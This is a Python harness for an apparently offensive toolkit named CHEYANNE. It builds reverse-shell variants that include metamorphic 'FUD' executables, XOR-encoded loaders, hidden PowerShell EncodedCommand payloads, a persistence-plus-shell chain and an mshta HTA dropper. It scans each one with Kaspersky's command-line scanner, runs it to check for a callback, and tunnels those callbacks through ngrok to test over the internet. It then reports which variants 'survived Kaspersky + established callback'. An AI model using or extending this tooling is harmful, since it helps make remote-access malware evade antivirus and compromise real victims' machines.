#!/usr/bin/env python3
"""
test_evasion.py — Kaspersky / RTP Evasion Test Harness
22DIV / george wu — CSEC research, own hardware only

Builds every CHEYANNE evasion variant, static-scans with Kaspersky CLI,
then runs each locally and checks for TCP callback.

Usage:
    python test_evasion.py
    python test_evasion.py --port 9876
    python test_evasion.py --no-build     (reuse existing test_builds/)
    python test_evasion.py --static-only  (scan only, skip behavioral)
"""

import os, sys, socket, subprocess, threading, time, json, shutil
import argparse, glob, winreg

ROOT       = os.path.dirname(os.path.abspath(__file__))
SHELL_DIR  = os.path.join(ROOT, "shell")
GHOST_DIR  = os.path.join(ROOT, "ghost-encoder")
GHOST_ENC  = os.path.join(GHOST_DIR, "ghost_encode.py")
BUILD_GL   = os.path.join(ROOT, "build_ghost_loader.py")
DEPLOY     = os.path.join(ROOT, "deploy.py")
METAMORPH  = os.path.join(ROOT, "metamorph.py")
MUTATE     = os.path.join(ROOT, "mutate.py")
TEST_DIR   = os.path.join(ROOT, "test_builds")
NGROK_API  = "http://127.0.0.1:4040/api/tunnels"

# ── colours ────────────────────────────────────────────────────────────────
GREEN = "\033[92m"; RED = "\033[91m"; AMBER = "\033[93m"
CYAN  = "\033[96m"; BOLD = "\033[1m"; RST   = "\033[0m"; DIM = "\033[2m"

def ok(m):   print(f"  {GREEN}[+]{RST} {m}")
def info(m): print(f"  {CYAN}[*]{RST} {m}")
def fail(m): print(f"  {RED}[!]{RST} {m}")
def warn(m): print(f"  {AMBER}[~]{RST} {m}")
def hl(c="─"): print(f"  {c*58}")
def hdr(m):
    print(); hl("═")
    print(f"  {BOLD}{CYAN}{m}{RST}")
    hl("─")

RESULTS = []   # (name, static, dynamic, notes)

# ── Kaspersky scanner ────────────────────────────────────────────────────────

KAV_PATHS = [
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky\avp.com",
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Security Cloud\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Security Cloud\avp.com",
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Free\avp.com",
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Anti-Virus\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Plus\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Standard\avp.com",
]

def find_kaspersky():
    for p in KAV_PATHS:
        if os.path.exists(p):
            return p
    for g in glob.glob(r"C:\Program Files*\Kaspersky Lab\**\avp.com", recursive=True):
        return g
    # registry fallback
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SOFTWARE\KasperskyLab")
        for i in range(winreg.QueryInfoKey(key)[0]):
            sub = winreg.EnumKey(key, i)
            try:
                sub2 = winreg.OpenKey(key, sub + r"\environment")
                path, _ = winreg.QueryValueEx(sub2, "ProductFolder")
                candidate = os.path.join(path, "avp.com")
                if os.path.exists(candidate):
                    return candidate
            except:
                pass
    except:
        pass
    return None

def kas_scan(kavs, filepath):
    """Returns ('CLEAN'|'DETECTED'|'ERROR'|'SKIP', detail_str)"""
    if not kavs:
        return "SKIP", "no KAV found"
    try:
        r = subprocess.run(
            [kavs, "SCAN", filepath, "/i0"],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
            timeout=45, cwd=os.path.dirname(kavs)
        )
        out = (r.stdout + r.stderr).strip()
        rc  = r.returncode
        lo  = out.lower()
        if rc == 0 and ("detected" not in lo) and ("threat" not in lo):
            return "CLEAN", out[:120]
        if "detected" in lo or "threat" in lo or "virus" in lo or rc in (1, 2, 3, 4, 5):
            # extract threat name if possible
            for line in out.splitlines():
                if "detected" in line.lower() or "threat" in line.lower():
                    return "DETECTED", line.strip()[:120]
            return "DETECTED", f"rc={rc}"
        return "ERROR", f"rc={rc} {out[:80]}"
    except subprocess.TimeoutExpired:
        return "ERROR", "scan timeout"
    except Exception as e:
        return "ERROR", str(e)[:80]

# ── ngrok ────────────────────────────────────────────────────────────────────

def get_ngrok():
    try:
        import urllib.request
        data = json.loads(urllib.request.urlopen(NGROK_API, timeout=3).read())
        t = data.get("tunnels", [])
        if t:
            url = t[0]["public_url"]
            h, p = url.replace("tcp://", "").rsplit(":", 1)
            return h, int(p)
    except:
        pass
    return None, None

def ensure_ngrok(local_port):
    h, p = get_ngrok()
    if h:
        ok(f"ngrok active: {h}:{p} -> localhost:{local_port}")
        return h, p
    info("Starting ngrok tcp tunnel...")
    subprocess.Popen(["ngrok", "tcp", str(local_port)],
                     creationflags=subprocess.CREATE_NEW_CONSOLE)
    for _ in range(8):
        time.sleep(1)
        h, p = get_ngrok()
        if h:
            ok(f"ngrok started: {h}:{p} -> localhost:{local_port}")
            return h, p
    fail("ngrok failed to start")
    return None, None

# ── TCP callback listener ────────────────────────────────────────────────────

class CallbackListener:
    def __init__(self, port):
        self.port    = port
        self.event   = threading.Event()
        self.peer    = None
        self._thread = None
        self._srv    = None

    def start(self):
        self._thread = threading.Thread(target=self._listen, daemon=True)
        self._thread.start()
        time.sleep(0.3)

    def _listen(self):
        try:
            self._srv = socket.socket()
            self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._srv.settimeout(25)
            self._srv.bind(("0.0.0.0", self.port))
            self._srv.listen(5)
            conn, addr = self._srv.accept()
            self.peer = addr
            conn.close()
            self._srv.close()
            self.event.set()
        except:
            pass

    def wait(self, timeout):
        return self.event.wait(timeout)

    def stop(self):
        try:
            if self._srv:
                self._srv.close()
        except:
            pass

# ── build helpers ─────────────────────────────────────────────────────────────

def run_silent(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True,
                          encoding="utf-8", errors="replace",
                          cwd=ROOT, **kw)

def build_baseline():
    info("Building baseline (vader_shell standard)...")
    run_silent([sys.executable, DEPLOY, "--compile"])
    src = os.path.join(SHELL_DIR, "vader_shell.exe")
    if not os.path.exists(src):
        fail("vader_shell.exe not produced"); return None
    dst = os.path.join(TEST_DIR, "t_baseline.exe")
    shutil.copy2(src, dst)
    ok(f"Baseline -> {os.path.basename(dst)}")
    return dst

def build_fud():
    info("Building FUD (metamorph + mutate + compile)...")
    run_silent([sys.executable, METAMORPH, "--target", "shell", "--intensity", "3"])
    run_silent([sys.executable, MUTATE])
    run_silent([sys.executable, DEPLOY, "--compile"])
    src = os.path.join(SHELL_DIR, "vader_shell.exe")
    if not os.path.exists(src):
        fail("FUD build failed"); return None
    dst = os.path.join(TEST_DIR, "t_fud.exe")
    shutil.copy2(src, dst)
    ok(f"FUD -> {os.path.basename(dst)}")
    return dst

def build_ghost_loader(ip, port):
    info(f"Building ghost_loader (target {ip}:{port})...")
    run_silent([sys.executable, BUILD_GL, ip, str(port)])
    src = os.path.join(SHELL_DIR, "ghost_loader.exe")
    if not os.path.exists(src):
        fail("ghost_loader.exe not produced"); return None
    dst = os.path.join(TEST_DIR, "t_ghost_loader.exe")
    shutil.copy2(src, dst)
    ok(f"Ghost Loader -> {os.path.basename(dst)}")
    return dst

def build_ghost_ps1(ip, port, method="iex"):
    info(f"Building ghost PS1 (--method {method}, {ip}:{port})...")
    out = os.path.join(TEST_DIR, f"t_ghost_{method}.ps1")
    env = os.environ.copy(); env["PYTHONIOENCODING"] = "utf-8"
    run_silent([sys.executable, GHOST_ENC, "--shell", ip, str(port),
                "--method", method, "-o", out], env=env, cwd=GHOST_DIR)
    if not os.path.exists(out):
        fail(f"ghost PS1 ({method}) not produced"); return None
    ok(f"Ghost PS1 ({method}) -> {os.path.basename(out)}")
    return out

def build_vader_chain(ip, port):
    info(f"Building VADER chain (persist+shell+screen, {ip}:{port})...")
    out = os.path.join(TEST_DIR, "t_vader_chain.ps1")
    env = os.environ.copy(); env["PYTHONIOENCODING"] = "utf-8"
    run_silent([sys.executable, GHOST_ENC, "--vader", ip, str(port),
                "-o", out], env=env, cwd=GHOST_DIR)
    if not os.path.exists(out):
        fail("VADER chain build failed"); return None
    ok(f"VADER chain -> {os.path.basename(out)}")
    return out

def build_ghost_hta(ip, port):
    info(f"Building ghost HTA delivery ({ip}:{port})...")
    ps1 = os.path.join(TEST_DIR, "_hta_payload.ps1")
    hta = os.path.join(TEST_DIR, "t_ghost.hta")
    env = os.environ.copy(); env["PYTHONIOENCODING"] = "utf-8"
    run_silent([sys.executable, GHOST_ENC, "--shell", ip, str(port), "-o", ps1],
               env=env, cwd=GHOST_DIR)
    run_silent([sys.executable, GHOST_ENC, ps1, "--deliver", "hta", "-o", hta],
               env=env, cwd=GHOST_DIR)
    if not os.path.exists(hta):
        fail("HTA build failed"); return None
    ok(f"Ghost HTA -> {os.path.basename(hta)}")
    return hta

# ── behavioral runners ────────────────────────────────────────────────────────

def run_exe(path, args=None, timeout=22):
    """Run an EXE, return (callback: bool, note: str)"""
    lsnr = CallbackListener(ARGS.port)
    lsnr.start()
    cmd = [path] + (args or [])
    try:
        proc = subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW
                                                  | subprocess.CREATE_NEW_PROCESS_GROUP)
    except Exception as e:
        lsnr.stop()
        return False, f"launch error: {e}"
    got = lsnr.wait(timeout)
    try: proc.kill()
    except: pass
    lsnr.stop()
    if got:
        return True, f"session from {lsnr.peer}"
    return False, "no callback within timeout"

def run_ps1(path, timeout=22):
    """Run a PS1 via EncodedCommand, return (callback: bool, note: str)"""
    try:
        with open(path, "rb") as f:
            raw = f.read()
        wlen = len(raw.decode("utf-8"))
        import base64
        # Build UTF-16LE base64 for -EncodedCommand
        b64 = base64.b64encode(raw.decode("utf-8").encode("utf-16-le")).decode()
    except Exception as e:
        return False, f"encode error: {e}"

    lsnr = CallbackListener(ARGS.port)
    lsnr.start()
    cmd = ["powershell", "-NoP", "-NonI", "-W", "Hidden", "-EncodedCommand", b64]
    try:
        proc = subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        lsnr.stop()
        return False, f"launch error: {e}"
    got = lsnr.wait(timeout)
    try: proc.kill()
    except: pass
    lsnr.stop()
    return (True, f"session from {lsnr.peer}") if got else (False, "no callback")

def run_hta(path, timeout=25):
    lsnr = CallbackListener(ARGS.port)
    lsnr.start()
    try:
        proc = subprocess.Popen(["mshta", path],
                                 creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
    except Exception as e:
        lsnr.stop()
        return False, f"mshta error: {e}"
    got = lsnr.wait(timeout)
    try: proc.kill()
    except: pass
    lsnr.stop()
    return (True, f"HTA session from {lsnr.peer}") if got else (False, "no callback")

# ── test runner ───────────────────────────────────────────────────────────────

def test_variant(name, path, run_fn, kavs, static_only=False):
    if not path or not os.path.exists(path):
        RESULTS.append((name, "BUILD FAIL", "N/A", "build error"))
        fail(f"{name}: build artifact missing")
        return

    print(f"\n  {CYAN}[>>] {name}{RST}  {DIM}({os.path.basename(path)}){RST}")

    # static scan
    static, sdetail = kas_scan(kavs, path)
    label = {"CLEAN": f"{GREEN}CLEAN{RST}", "DETECTED": f"{RED}DETECTED{RST}",
             "SKIP": f"{AMBER}NO KAV{RST}", "ERROR": f"{AMBER}ERROR{RST}"}
    print(f"       Static : {label.get(static, static)}  {DIM}{sdetail[:80]}{RST}")

    if static_only:
        RESULTS.append((name, static, "SKIPPED", sdetail[:60]))
        return

    # behavioral
    if static == "DETECTED":
        warn("       Skipping behavioral — blocked on disk")
        RESULTS.append((name, static, "SKIPPED", "AV blocked file"))
        return

    dyn, dnote = run_fn(path)
    dlabel = f"{GREEN}CALLBACK{RST}" if dyn else f"{RED}NO CALLBACK{RST}"
    print(f"       Dynamic: {dlabel}  {DIM}{dnote[:80]}{RST}")
    RESULTS.append((name, static, "CALLBACK" if dyn else "NO CALLBACK", dnote[:60]))

# ── report ────────────────────────────────────────────────────────────────────

def report():
    print()
    hl("═")
    print(f"  {BOLD}EVASION TEST RESULTS — KASPERSKY RTP{RST}")
    hl("─")
    print(f"  {'Variant':<26} {'Static':<12} {'Dynamic':<14} Notes")
    print(f"  {'───────':<26} {'──────':<12} {'───────':<14} ─────")
    for name, static, dynamic, notes in RESULTS:
        sc = GREEN if static == "CLEAN" else (RED if static == "DETECTED" else AMBER)
        dc = GREEN if dynamic == "CALLBACK" else (RED if "NO" in dynamic else AMBER)
        print(f"  {name:<26} {sc}{static:<12}{RST} {dc}{dynamic:<14}{RST} {DIM}{notes}{RST}")
    hl("─")
    c = sum(1 for _, s, d, _ in RESULTS if s != "DETECTED" and d == "CALLBACK")
    t = len(RESULTS)
    col = GREEN if c > 0 else RED
    print(f"\n  {col}{BOLD}{c}/{t} variants survived Kaspersky + established callback{RST}")
    hl("═")
    # save JSON
    out = os.path.join(TEST_DIR, "results.json")
    with open(out, "w", encoding="utf-8") as f:
        json.dump([{"variant": n, "static": s, "dynamic": d, "notes": x}
                   for n, s, d, x in RESULTS], f, indent=2)
    print(f"\n  {DIM}Results saved: {out}{RST}\n")

# ── main ──────────────────────────────────────────────────────────────────────

ARGS = None

def main():
    global ARGS
    p = argparse.ArgumentParser(description="CHEYANNE evasion test harness")
    p.add_argument("--port",        type=int, default=9876,
                   help="Local TCP callback port (default 9876, avoids conflict with C2 on 4443)")
    p.add_argument("--no-build",    action="store_true", help="Skip build, test existing test_builds/")
    p.add_argument("--static-only", action="store_true", help="Scan only — do not execute any binary")
    p.add_argument("--skip-ghost",  action="store_true", help="Skip ghost encoder variants")
    ARGS = p.parse_args()

    os.makedirs(TEST_DIR, exist_ok=True)

    print(f"\n  {BOLD}{RED}=== CHEYANNE EVASION TEST HARNESS ==={RST}")
    print(f"  {DIM}Kaspersky RTP expected active. Tests run on own hardware.{RST}")
    print(f"  {DIM}Callback port: {ARGS.port}  |  test_builds/ -> {TEST_DIR}{RST}\n")

    # ── 1. Kaspersky ──────────────────────────────────────────────────────────
    hdr("STEP 1 — Kaspersky CLI")
    kavs = find_kaspersky()
    if kavs:
        ok(f"Found: {kavs}")
    else:
        warn("Kaspersky CLI (avp.com) not found — static scans will show NO KAV")
        warn("Install Kaspersky or locate avp.com manually")

    # ── 2. Ngrok ──────────────────────────────────────────────────────────────
    hdr("STEP 2 — Ngrok (WAN tunnel for external tests)")
    ngrok_h, ngrok_p = ensure_ngrok(ARGS.port)
    if ngrok_h:
        ok(f"WAN address available: {ngrok_h}:{ngrok_p}")
    else:
        warn("Ngrok unavailable — WAN test skipped, local only")

    # ── 3. Build ──────────────────────────────────────────────────────────────
    hdr("STEP 3 — Build All Variants")
    ip    = "127.0.0.1"
    port  = ARGS.port

    if ARGS.no_build:
        warn("--no-build: using existing test_builds/")
        t_base  = os.path.join(TEST_DIR, "t_baseline.exe")
        t_fud   = os.path.join(TEST_DIR, "t_fud.exe")
        t_gl    = os.path.join(TEST_DIR, "t_ghost_loader.exe")
        t_ps1   = os.path.join(TEST_DIR, "t_ghost_iex.ps1")
        t_asm   = os.path.join(TEST_DIR, "t_ghost_assembly.ps1")
        t_vader = os.path.join(TEST_DIR, "t_vader_chain.ps1")
        t_hta   = os.path.join(TEST_DIR, "t_ghost.hta")
    else:
        t_base  = build_baseline()
        t_fud   = build_fud()
        t_gl    = build_ghost_loader(ip, port)
        if not ARGS.skip_ghost:
            t_ps1   = build_ghost_ps1(ip, port, method="iex")
            t_asm   = build_ghost_ps1(ip, port, method="assembly")
            t_vader = build_vader_chain(ip, port)
            t_hta   = build_ghost_hta(ip, port)
        else:
            t_ps1 = t_asm = t_vader = t_hta = None

    # ── 4. Test ───────────────────────────────────────────────────────────────
    hdr("STEP 4 — Static + Behavioral Tests")

    test_variant("Baseline Shell",
                 t_base,
                 lambda p: run_exe(p, ["127.0.0.1", str(port)]),
                 kavs, ARGS.static_only)

    test_variant("FUD Shell (metamorph)",
                 t_fud,
                 lambda p: run_exe(p, ["127.0.0.1", str(port)]),
                 kavs, ARGS.static_only)

    test_variant("Ghost Loader (XOR+b64)",
                 t_gl,
                 lambda p: run_exe(p),
                 kavs, ARGS.static_only)

    if not ARGS.skip_ghost:
        test_variant("Ghost PS1 (IEX)",
                     t_ps1,
                     lambda p: run_ps1(p),
                     kavs, ARGS.static_only)

        test_variant("Ghost PS1 (Assembly/.NET)",
                     t_asm,
                     lambda p: run_ps1(p),
                     kavs, ARGS.static_only)

        test_variant("VADER Chain (persist+shell)",
                     t_vader,
                     lambda p: run_ps1(p),
                     kavs, ARGS.static_only)

        test_variant("Ghost HTA (mshta delivery)",
                     t_hta,
                     lambda p: run_hta(p),
                     kavs, ARGS.static_only)

    # ── 5. WAN test (ngrok) ───────────────────────────────────────────────────
    if ngrok_h and not ARGS.static_only:
        hdr("STEP 5 — WAN Test (ngrok) — Ghost Loader")
        info(f"Rebuilding ghost_loader for WAN: {ngrok_h}:{ngrok_p}")
        t_gl_wan = build_ghost_loader(ngrok_h, ngrok_p)
        if t_gl_wan:
            test_variant("Ghost Loader (WAN/ngrok)",
                         t_gl_wan,
                         lambda p: run_exe(p),
                         kavs, False)

    # ── Report ────────────────────────────────────────────────────────────────
    report()


if __name__ == "__main__":
    main()
